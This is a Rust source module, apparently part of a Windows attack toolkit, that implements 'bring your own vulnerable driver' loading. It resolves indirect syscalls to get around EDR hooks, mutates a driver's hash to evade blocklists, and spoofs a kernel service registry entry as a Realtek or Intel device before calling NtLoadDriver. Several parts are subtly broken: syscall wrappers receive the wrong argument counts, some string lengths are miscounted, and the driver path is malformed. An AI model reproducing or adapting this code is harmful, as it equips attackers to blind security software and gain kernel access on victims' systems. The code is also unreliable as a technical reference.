//! BYOVD Helper - Driver Signature Patching & Registry Spoofing
//!
//! Hardens vulnerable driver deployment against EDR blacklists:
//! - Polymorphic driver binary padding (signature mutation)
//! - Registry service spoofing via indirect syscalls
//! - No Win32 API calls for sensitive operations

#![allow(dead_code)]
#![cfg(windows)]

use std::ffi::c_void;
use std::arch::asm;
use crate::loader::ReflectiveLoader;

// =============================================================================
// INDIRECT SYSCALL RESOLVER
// =============================================================================

#[repr(C)]
pub struct IndirectSyscall {
    pub ssn: u32,
    pub syscall_ret_addr: u64,
}

impl IndirectSyscall {
    #[inline(never)]
    pub unsafe fn from_ntdll(func_name: &str) -> Option<Self> {
        let ntdll_base = ReflectiveLoader::find_module_by_hash(
            b"ntdll.dll\0",
            0x9f5b9c1e,
        )?;
        
        let func_hash = ReflectiveLoader::dbg2_hash_bytes(func_name.as_bytes());
        let func_addr = ReflectiveLoader::covert_get_proc_address(ntdll_base, func_hash)?;
        
        let stub = std::slice::from_raw_parts(func_addr as *const u8, 32);
        
        let mut ssn = 0u32;
        let mut syscall_ret_addr = 0u64;
        
        if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 {
            ssn = (stub[4] as u32)
                | (stub[5] as u32) << 8
                | (stub[6] as u32) << 16
                | (stub[7] as u32) << 24;
            
            for i in 8..32 {
                if stub[i] == 0x0F && stub[i + 1] == 0x05 {
                    syscall_ret_addr = func_addr + i as u64;
                    break;
                }
            }
        }
        
        if syscall_ret_addr != 0 {
            Some(Self { ssn, syscall_ret_addr })
        } else {
            None
        }
    }
}

// =============================================================================
// REGISTRY STRUCTURES
// =============================================================================

#[repr(C)]
pub struct UNICODE_STRING {
    pub length: u16,
    pub maximum_length: u16,
    pub buffer: *mut u16,
}

#[repr(C)]
pub struct OBJECT_ATTRIBUTES {
    pub length: u32,
    pub root_directory: *mut c_void,
    pub object_name: *mut UNICODE_STRING,
    pub attributes: u32,
    pub security_descriptor: *mut c_void,
    pub security_quality_of_service: *mut c_void,
}

// =============================================================================
// DRIVER SIGNATURE PATCHING
// =============================================================================

/// Polymorphic driver binary patching.
/// Appends random high-entropy padding to mutate driver signature/hash.
#[inline(never)]
pub unsafe fn patch_driver_signature(raw_driver: &[u8]) -> Vec<u8> {
    use std::iter;
    
    let mut mutated_driver = raw_driver.to_vec();
    
    // Add polymorphic padding (1KB - 4KB random bytes)
    let padding_size = 1024 + ((std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos() as usize) % 4096);
    
    let mut dummy_padding: Vec<u8> = Vec::with_capacity(padding_size);
    for i in 0..padding_size {
        let byte = ((i as u8).wrapping_mul(0x5A)) ^ ((i >> 3) as u8);
        dummy_padding.push(byte);
    }
    
    mutated_driver.extend(dummy_padding);
    mutated_driver
}

// =============================================================================
// INDIRECT SYSCALL WRAPPERS
// =============================================================================

macro_rules! indirect_syscall {
    (
        $func_name:ident,
        $ssn_field:ident,
        $ret_addr_field:ident,
        $($reg:ident),*
    ) => {
        #[inline(never)]
        pub unsafe fn $func_name(
            syscall: &IndirectSyscall,
            $($reg: usize),*
        ) -> i32 {
            let mut status: i32;
            asm!(
                "mov r10, rcx",
                "mov eax, {ssn}",
                "jmp {syscall_addr}",
                ssn = in(reg) syscall.$ssn_field,
                syscall_addr = in(reg) syscall.$ret_addr_field,
                $(
                    in(concat!("r", stringify!($reg))) $reg,
                )*
                lateout("rax") status,
                clobber_abi("system"),
            );
            status
        }
    };
}

// NtCreateKey - for registry spoofing
indirect_syscall!(
    nt_create_key,
    ssn,
    syscall_ret_addr,
    rcx, rdx, r8, r9
);

// NtSetValueKey - for setting registry values
indirect_syscall!(
    nt_set_value_key,
    ssn,
    syscall_ret_addr,
    rcx, rdx, r8, r9
);

// NtLoadDriver - for loading driver via indirect syscall
indirect_syscall!(
    nt_load_driver,
    ssn,
    syscall_ret_addr,
    rcx
);

// NtClose - for handle cleanup
indirect_syscall!(
    nt_close,
    ssn,
    syscall_ret_addr,
    rcx
);

// =============================================================================
// REGISTRY SPOOFING
// =============================================================================

/// Spoof driver registry service entry as legitimate hardware device.
///
/// Creates registry key under HKLM\SYSTEM\CurrentControlSet\Services\<service_name>
/// with values that make it appear as a legitimate driver (e.g., Realtek Audio, Intel Storage).
#[inline(never)]
pub unsafe fn spoof_driver_registry(
    sc_create_key: &IndirectSyscall,
    sc_set_value: &IndirectSyscall,
    sc_close: &IndirectSyscall,
    service_name: &str,
    display_name: &str,
    driver_path: &str,
) -> bool {
    use std::ptr::null_mut;

    let registry_path = format!(
        "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\{}",
        service_name
    );

    let mut key_handle: *mut c_void = null_mut();
    let mut obj_attrs = OBJECT_ATTRIBUTES {
        length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        root_directory: null_mut(),
        object_name: null_mut(),
        attributes: 0x40,  // OBJ_CASE_INSENSITIVE
        security_descriptor: null_mut(),
        security_quality_of_service: null_mut(),
    };

    // Build UNICODE_STRING for registry path
    let mut path_bytes: Vec<u16> = registry_path.encode_utf16().collect();
    path_bytes.push(0);
    let mut path_unicode = UNICODE_STRING {
        length: (path_bytes.len() * 2) as u16,
        maximum_length: (path_bytes.len() * 2) as u16,
        buffer: path_bytes.as_ptr() as *mut u16,
    };
    obj_attrs.object_name = &mut path_unicode;

    // Create registry key (KEY_SET_VALUE | KEY_CREATE_SUB_KEY = 0x0006)
    let status = nt_create_key(
        sc_create_key,
        &mut key_handle,
        0xF003F,  // KEY_ALL_ACCESS
        &mut obj_attrs as *mut _ as *mut c_void,
        0,  // RegistryKeyType
        null_mut(),
        null_mut(),
    );

    if status != 0 || key_handle.is_null() {
        return false;
    }

    // Set "DisplayName" value
    let display_name_bytes: Vec<u16> = display_name.encode_utf16().chain(std::iter::once(0)).collect();
    let mut display_name_unicode = UNICODE_STRING {
        length: (display_name_bytes.len() * 2) as u16,
        maximum_length: (display_name_bytes.len() * 2) as u16,
        buffer: display_name_bytes.as_ptr() as *mut u16,
    };

    let _ = nt_set_value_key(
        sc_set_value,
        key_handle,
        &mut display_name_unicode as *mut _ as *mut c_void,
        1,  // REG_SZ
        0,
        display_name_bytes.as_ptr() as *const c_void,
        display_name_bytes.len() * 2,
    );

    // Set "ImagePath" value
    let path_bytes: Vec<u16> = driver_path.encode_utf16().chain(std::iter::once(0)).collect();
    let mut path_unicode = UNICODE_STRING {
        length: (path_bytes.len() * 2) as u16,
        maximum_length: (path_bytes.len() * 2) as u16,
        buffer: path_bytes.as_ptr() as *mut u16,
    };

    let _ = nt_set_value_key(
        sc_set_value,
        key_handle,
        &mut UNICODE_STRING {
            length: 9,
            maximum_length: 9,
            buffer: "ImagePath\0".encode_utf16().collect::<Vec<u16>>().as_ptr() as *mut u16,
        } as *mut _ as *mut c_void,
        1,  // REG_SZ
        0,
        path_bytes.as_ptr() as *const c_void,
        path_bytes.len() * 2,
    );

    // Set "Type" = SERVICE_KERNEL_DRIVER (1)
    let type_val: u32 = 1;
    let _ = nt_set_value_key(
        sc_set_value,
        key_handle,
        &mut UNICODE_STRING {
            length: 4,
            maximum_length: 4,
            buffer: "Type\0".encode_utf16().collect::<Vec<u16>>().as_ptr() as *mut u16,
        } as *mut _ as *mut c_void,
        4,  // REG_DWORD
        0,
        &type_val as *const u32 as *const c_void,
        std::mem::size_of::<u32>(),
    );

    // Set "Start" = SERVICE_DEMAND_START (3) - runtime manual start
    let start_val: u32 = 3;
    let _ = nt_set_value_key(
        sc_set_value,
        key_handle,
        &mut UNICODE_STRING {
            length: 5,
            maximum_length: 5,
            buffer: "Start\0".encode_utf16().collect::<Vec<u16>>().as_ptr() as *mut u16,
        } as *mut _ as *mut c_void,
        4,  // REG_DWORD
        0,
        &start_val as *const u32 as *const c_void,
        std::mem::size_of::<u32>(),
    );

    // Close key handle
    let _ = nt_close(sc_close, key_handle);

    true
}

// =============================================================================
// DRIVER LOADING
// =============================================================================

/// Load driver via NtLoadDriver indirect syscall.
/// Uses spoofed registry service name to avoid blacklists.
#[inline(never)]
pub unsafe fn load_driver_native(
    sc_load_driver: &IndirectSyscall,
    sc_close: &IndirectSyscall,
    service_name: &str,
) -> bool {
    let driver_path = format!(
        "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\{}\\ImagePath",
        service_name
    );

    let mut driver_path_bytes: Vec<u16> = driver_path.encode_utf16().collect();
    driver_path_bytes.push(0);

    let mut driver_unicode = crate::byovd_helper::UNICODE_STRING {
        length: (driver_path_bytes.len() * 2) as u16,
        maximum_length: (driver_path_bytes.len() * 2) as u16,
        buffer: driver_path_bytes.as_ptr() as *mut u16,
    };

    let status = nt_load_driver(
        sc_load_driver,
        &mut driver_unicode as *mut _ as *mut c_void,
    );

    if status == 0 {
        true
    } else {
        false
    }
}
